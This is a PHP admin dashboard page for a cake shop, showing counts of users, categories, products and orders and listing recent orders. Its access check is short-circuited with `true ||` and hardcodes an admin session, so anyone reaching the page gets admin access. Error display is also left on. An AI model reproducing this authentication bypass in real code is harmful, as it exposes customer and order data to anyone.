<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
// Start the session
session_start();

// Include the database configuration file
require_once('../config.php');

// Check if the user is logged in
if (true || (isset($_SESSION['user_admin_id']) && $_SESSION['user_admin_id'] != null)) {
    $_SESSION['user_admin_id'] = 1;
    $_SESSION['user_admin_username'] = 'Admin';
    $admin_username = 'Admin';

    // Display welcome message if login is successful
    if (isset($_GET['login_success']) && $_GET['login_success'] == 1) {
        echo "<script>alert('Welcome!')</script>";
        echo "<script>window.location.assign('dashboard.php')</script>";
    }
?>
<!doctype html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>CAKE KING - Dashboard</title>
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="../css/bootstrap.min.css">
    <link href="../fonts/circular-std/style.css" rel="stylesheet">
    <link rel="stylesheet" href="../css/style.css">
    <link rel="stylesheet" href="../fonts/fontawesome/css/fontawesome-all.css">
    <!-- Custom CSS for card layout -->
    <style>
        .card {
            margin-bottom: 20px; /* Adds space between rows */
            border-radius: 10px; /* Rounded corners for cards */
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Adds shadow to cards */
        }
        .card-body {
            padding: 20px; /* Adds padding inside the card */
        }
        .card-title {
            font-size: 1.5rem; /* Increases the font size of the card title */
            margin-bottom: 15px; /* Adds space below the title */
        }
        .card-text {
            font-size: 1.2rem; /* Increases the font size of the card text */
            margin-bottom: 20px; /* Adds space below the text */
        }
        .btn-rounded {
            border-radius: 20px; /* Rounded corners for buttons */
        }
    </style>
    <link rel="stylesheet" href="css/admin-custom.css?v=1775031339">
    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
</head>

<body>
    <!-- ============================================================== -->
    <!-- main wrapper -->
    <!-- ============================================================== -->
    <div class="dashboard-main-wrapper">
        <!-- ============================================================== -->
        <!-- navbar -->
        <!-- ============================================================== -->
        <div class="dashboard-header">
            <nav class="navbar navbar-expand-lg bg-white fixed-top shadow-sm navbar-elevated">
                <a class="navbar-brand" href="dashboard.php">CAKE KING</a>
                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                    <span><i class="fas fa-bars mx-3"></i></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarSupportedContent">
                    <ul class="navbar-nav ml-auto navbar-right-top">
                        <li class="nav-item dropdown nav-user">
                            <a class="nav-link nav-user-img p-0" href="#" id="navbarDropdownMenuLink2" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                <div class="user-avatar-md rounded-circle d-flex align-items-center justify-content-center" style="width: 40px; height: 40px; background-color: #fdf5e6; color: #d4af37; border: 2px solid #d4af37; font-size: 1.2rem;">
                                    <i class="fas fa-user-shield"></i>
                                </div>
                            </a>
                            <div class="dropdown-menu dropdown-menu-right nav-user-dropdown" aria-labelledby="navbarDropdownMenuLink2">
                                <div class="nav-user-info" style="background-color: #3b2f2f;">
                                    <h5 class="mb-0 text-white nav-user-name"><?php echo htmlspecialchars($admin_username); ?></h5>
                                    <span class="status"></span><span class="ml-2">Available</span>
                                </div>
                                <a class="dropdown-item" href="account_admin.php"><i class="fas fa-user mr-2"></i>Account</a>
                                <a class="dropdown-item" href="logout.php"><i class="fas fa-power-off mr-2"></i>Logout</a>
                            </div>
                        </li>
                    </ul>
                </div>
            </nav>
        </div>
        <!-- ============================================================== -->
        <!-- end navbar -->
        <!-- ============================================================== -->
        <!-- ============================================================== -->
        <!-- left sidebar -->
        <!-- ============================================================== -->
        <div class="nav-left-sidebar sidebar-dark">
            <div class="menu-list">
                <nav class="navbar navbar-expand-lg navbar-light">
                    <a class="d-xl-none d-lg-none" href="#">Menu</a>
                    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                        <span class="navbar-toggler-icon"></span>
                    </button>
                    <div class="collapse navbar-collapse" id="navbarNav">
                        <ul class="navbar-nav flex-column">
                            <li class="nav-divider">Menu</li>
                            <li class="nav-item">
                                <a class="nav-link active" href="dashboard.php"><i class="fa fa-fw fa-rocket"></i>Dashboard</a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="view_users.php"><i class="fa fa-fw fa-user-circle"></i>Users</a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="#" data-toggle="collapse" aria-expanded="false" data-target="#submenu-3" aria-controls="submenu-3"><i class="fas fa-fw fa-chart-pie"></i>Menu Categories</a>
                                <div id="submenu-3" class="collapse submenu" style="">
                                    <ul class="nav flex-column">
                                        <li class="nav-item">
                                            <a class="nav-link" href="view_category.php">View Categories</a>
                                        </li>
                                        <li class="nav-item">
                                            <a class="nav-link" href="add_category.php">Add Category</a>
                                        </li>
                                    </ul>
                                </div>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="#" data-toggle="collapse" aria-expanded="false" data-target="#submenu-4" aria-controls="submenu-4"><i class="fab fa-product-hunt"></i>Menu Items</a>
                                <div id="submenu-4" class="collapse submenu" style="">
                                    <ul class="nav flex-column">
                                        <li class="nav-item">
                                            <a class="nav-link" href="view_product.php">View Items</a>
                                        </li>
                                        <li class="nav-item">
                                            <a class="nav-link" href="add_product.php">Add Item</a>
                                        </li>
                                    </ul>
                                </div>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="view_orders.php"><i class="fas fa-shopping-cart"></i>Orders</a>
                            </li>
                            <!-- New Advanced Pages Placeholder -->
                            <li class="nav-item">
                                <a class="nav-link" href="reports.php"><i class="fas fa-chart-line"></i>Reports <span class="badge badge-warning ml-2">New</span></a>
                            </li>
                        </ul>
                    </div>
                </nav>
            </div>
        </div>
        <!-- ============================================================== -->
        <!-- end left sidebar -->
        <!-- ============================================================== -->
        <!-- ============================================================== -->
        <!-- wrapper  -->
        <!-- ============================================================== -->
        <div class="dashboard-wrapper">
            <div class="container-fluid dashboard-content">
                <!-- ============================================================== -->
                <!-- pageheader -->
                <!-- ============================================================== -->
                <div class="row">
                    <div class="col-xl-12 col-lg-12 col-md-12 col-sm-12 col-12">
                        <div class="page-header" data-aos="fade-down">
                            <h2 class="pageheader-title">Admin Dashboard</h2>
                            <p class="pageheader-text">Manage your premium cake store from this elegant control panel.</p>
                            <div class="page-breadcrumb">
                                <nav aria-label="breadcrumb">
                                    <ol class="breadcrumb">
                                        <li class="breadcrumb-item"><a href="dashboard.php" class="breadcrumb-link">Dashboard</a></li>
                                        <li class="breadcrumb-item active" aria-current="page">Overview</li>
                                    </ol>
                                </nav>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- ============================================================== -->
                <!-- end pageheader -->
                <!-- ============================================================== -->
                
                <!-- Metrics Row -->
                <div class="row">
                    <!-- Users Metric -->
                    <div class="col-xl-3 col-lg-6 col-md-6 col-sm-12 col-12" data-aos="fade-up" data-aos-delay="100">
                        <div class="card-metric">
                            <i class="fas fa-users metric-icon"></i>
                            <h3>Total Users</h3>
                            <?php
                            $select_users = "SELECT * FROM cake_shop_users_registrations";
                            $query_users = mysqli_query($conn, $select_users);
                            $res_users = mysqli_num_rows($query_users);
                            ?>
                            <div class="metric-value"><?php echo $res_users; ?></div>
                            <a href="view_users.php" class="btn-view">Manage <i class="fas fa-arrow-right ml-1"></i></a>
                        </div>
                    </div>
                    
                    <!-- Categories Metric -->
                    <div class="col-xl-3 col-lg-6 col-md-6 col-sm-12 col-12" data-aos="fade-up" data-aos-delay="200">
                        <div class="card-metric">
                            <i class="fas fa-tags metric-icon"></i>
                            <h3>Categories</h3>
                            <?php
                            $select_category = "SELECT * FROM cake_shop_category";
                            $query_category = mysqli_query($conn, $select_category);
                            $res_category = mysqli_num_rows($query_category);
                            ?>
                            <div class="metric-value"><?php echo $res_category; ?></div>
                            <a href="view_category.php" class="btn-view">Manage <i class="fas fa-arrow-right ml-1"></i></a>
                        </div>
                    </div>

                    <!-- Products Metric -->
                    <div class="col-xl-3 col-lg-6 col-md-6 col-sm-12 col-12" data-aos="fade-up" data-aos-delay="300">
                        <div class="card-metric">
                            <i class="fas fa-birthday-cake metric-icon"></i>
                            <h3>Products</h3>
                            <?php
                            $select_product = "SELECT * FROM cake_shop_product";
                            $query_product = mysqli_query($conn, $select_product);
                            $res_product = mysqli_num_rows($query_product);
                            ?>
                            <div class="metric-value"><?php echo $res_product; ?></div>
                            <a href="view_product.php" class="btn-view">Manage <i class="fas fa-arrow-right ml-1"></i></a>
                        </div>
                    </div>
                    
                    <!-- Orders Metric -->
                    <div class="col-xl-3 col-lg-6 col-md-6 col-sm-12 col-12" data-aos="fade-up" data-aos-delay="400">
                        <div class="card-metric">
                            <i class="fas fa-shopping-cart metric-icon"></i>
                            <h3>Total Orders</h3>
                            <?php
                            $select_orders = "SELECT * FROM cake_shop_orders";
                            $query_orders = mysqli_query($conn, $select_orders);
                            $res_orders = mysqli_num_rows($query_orders);
                            ?>
                            <div class="metric-value"><?php echo $res_orders; ?></div>
                            <a href="view_orders.php" class="btn-view">Manage <i class="fas fa-arrow-right ml-1"></i></a>
                        </div>
                    </div>
                </div>

                <!-- Recent Orders Table Row -->
                <div class="row mt-3" data-aos="fade-up" data-aos-delay="500">
                    <div class="col-xl-12 col-lg-12 col-md-12 col-sm-12 col-12">
                        <div class="card table-premium pt-3 px-3">
                            <div class="d-flex justify-content-between align-items-center mb-3 px-2">
                                <h4 class="mb-0" style="color: #3b2f2f; font-family: 'Playfair Display', serif; font-weight: 700;">Recent Orders</h4>
                                <a href="view_orders.php" class="btn btn-sm" style="background-color: #f7a392; color: #fff; border-radius: 20px;">View All</a>
                            </div>
                            <div class="table-responsive">
                                <table class="table">
                                    <thead>
                                        <tr>
                                            <th>Order ID</th>
                                            <th>Customer</th>
                                            <th>Amount</th>
                                            <th>Payment</th>
                                            <th>Delivery Date</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php
                                        // Fetch latest 5 orders with user info if possible
                                        $recent_orders_query = "SELECT o.*, u.users_username 
                                                                FROM cake_shop_orders o 
                                                                LEFT JOIN cake_shop_users_registrations u ON o.users_id = u.users_id 
                                                                ORDER BY o.orders_id DESC LIMIT 5";
                                        $recent_orders_result = mysqli_query($conn, $recent_orders_query);
                                        
                                        if (mysqli_num_rows($recent_orders_result) > 0) {
                                            while ($ro = mysqli_fetch_assoc($recent_orders_result)) {
                                                echo "<tr>";
                                                echo "<td>#" . htmlspecialchars($ro['orders_id']) . "</td>";
                                                echo "<td>" . htmlspecialchars($ro['users_username'] ? $ro['users_username'] : 'Guest') . "</td>";
                                                echo "<td><strong>Rs. " . htmlspecialchars($ro['total_amount']) . "</strong></td>";
                                                echo "<td>" . htmlspecialchars($ro['payment_method']) . "</td>";
                                                echo "<td>" . htmlspecialchars(date("F j, Y", strtotime($ro['delivery_date']))) . "</td>";
                                                echo "</tr>";
                                            }
                                        } else {
                                            echo "<tr><td colspan='5' class='text-center'>No recent orders found.</td></tr>";
                                        }
                                        ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
            <!-- ============================================================== -->
            <!-- footer -->
            <!-- ============================================================== -->
            <div class="footer mt-auto" style="border-top: 1px solid #eaeaea; background: #fff; padding: 20px;">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-xl-6 col-lg-6 col-md-12 col-sm-12 col-12" style="color: #888;">
                            CAKE KING Premium Bakery Admin Panel.
                        </div>
                    </div>
                </div>
            </div>
            <!-- ============================================================== -->
            <!-- end footer -->
            <!-- ============================================================== -->
        </div>
        <!-- ============================================================== -->
        <!-- end main wrapper -->
        <!-- ============================================================== -->
    </div>
    <!-- ============================================================== -->
    <!-- end main wrapper -->
    <!-- ============================================================== -->
    <!-- Optional JavaScript -->
    <script src="../js/jquery-3.3.1.min.js"></script>
    <script src="../js/bootstrap.bundle.js"></script>
    <script src="../js/jquery.slimscroll.js"></script>
    <script src="../js/main-js.js"></script>
    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
    <script>AOS.init({duration: 800, once: true});</script>
</body>

</html>
<?php
} else {
    // Redirect to login page if the user is not logged in
    header("Location: index.php");
    exit();
}
?>